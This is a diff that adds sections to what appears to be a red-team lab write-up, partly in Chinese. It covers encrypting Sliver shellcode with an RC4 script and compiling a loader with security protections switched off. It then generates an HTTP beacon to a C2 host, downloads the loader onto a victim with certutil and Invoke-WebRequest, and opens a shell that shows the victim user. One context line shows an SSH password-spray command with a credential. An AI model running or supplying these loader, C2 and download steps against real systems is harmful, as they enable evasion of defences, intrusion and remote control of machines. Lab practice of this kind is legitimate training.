@@ -596,9 +596,122 @@ proxychains4 -q crackmapexec ssh 172.16.21.3-254 -u "Terry.Lowe" -p 'Summer2023'
 
 ## <span style="color:lightblue">Writing a Loader</span>
 
+```
+sliver 生成shellcode
+```
+
+### <span style="color:lightgreen">rc4</span>
+
+```python
+import sys
+
+def rc4(data, key):
+	keylen = len(key)
+	s = list(range(256))
+	j = 0
+	for i in range(256):
+		j = (j + s[i] + key[i % keylen]) % 256
+		s[i], s[j] = s[j], s[i]
+
+	i = 0
+	j = 0
+	encrypted = bytearray()
+	for n in range(len(data)):
+		i = (i + 1) % 256
+		j = (j + s[i]) % 256
+		s[i], s[j] = s[j], s[i]
+		encrypted.append(data[n] ^ s[(s[i] + s[j]) % 256])
+
+	return encrypted
+
+if __name__ == '__main__':
+	if len(sys.argv) != 3:
+		print("Usage: ./rc4.py <key> <filename>")
+		exit(0)
+
+	key = sys.argv[1]
+	filename = sys.argv[2]
+
+	with open(filename, 'rb') as f:
+		data = f.read()
+
+	encrypted = rc4(data, key.encode())
+
+	with open(f"{filename}.enc", 'wb') as f:
+		f.write(encrypted)
+
+	print(f"Written {filename}.enc")%
+```
+
+```bash
+python3 rc4.py advapi43.dll http.bin
+
+hexdump -v -e '1/2 "dw 0%.4xh\n"' http.bin.enc|tee out.txt
+
+-rw-r--r--  1 kali kali  11013340 Nov  3 08:03  http.bin.enc
+```
+
+
+```c++
+源代码暂时不放
+```
+
+```
+To compile, you need to put the source into a new C++ Console project in Visual Studio.
+Then right click the project and add the "MASM" Build Dependency.
+You also want to change those:
+
+Configuration -> C/C++ -> Code Generation -> Runtime Library: MT
+Configuration -> C/C++ -> Code Generation -> Security Check:  GS-
+Configuration -> C/C++ -> Linker -> Debugging -> No
+Configuration -> C/C++ -> Linker -> Dynamic Base -> No
+Configuration -> C/C++ -> Linker -> DEP -> No
+```
+
+```
+data.asm
+
+.CODE
+RunData PROC
+... hex code
+RunData ENDP
+END
+```
+
+```
+编译即可
+```
+![](/assets/post_img/2023-11-03%20201747_Wutai_Loaders_scan.png)
+
+
 ## <span style="color:lightblue">Getting a Beacon</span>
 
+```bash
+[server] sliver > generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --http 10.8.0.227?proxy=http://172.16.21.50:8080,10.8.0.227?driver=wininet --name wutai-http --save /home/kali/Desktop/http.bin -G --skip-symbols
 
+[server] sliver > http
+```
 
+```bash
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
-### <span style="color:lightgreen"></span>
+受害机器:
+
+certutil.exe -urlcache -f http://10.8.0.227:8000/Loaders.exe Loaders.exe
+iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile Loaders.exe
+```
+
+```bash
+use 153139b3-56bb-40f2-984f-84e8f4b9ac4f
+interactive
+
+use 48f7e70d-d729-411e-b281-8377064863bf
+whoami
+
+WORK-JUNON\Hazel.Simpson
+```
+
+![](/assets/post_img/2023-11-03%20204024_Wutai_initbeacon.png)
+
+## <span style="color:lightblue">Browser Credentials & Playing with Bitwarden</span>
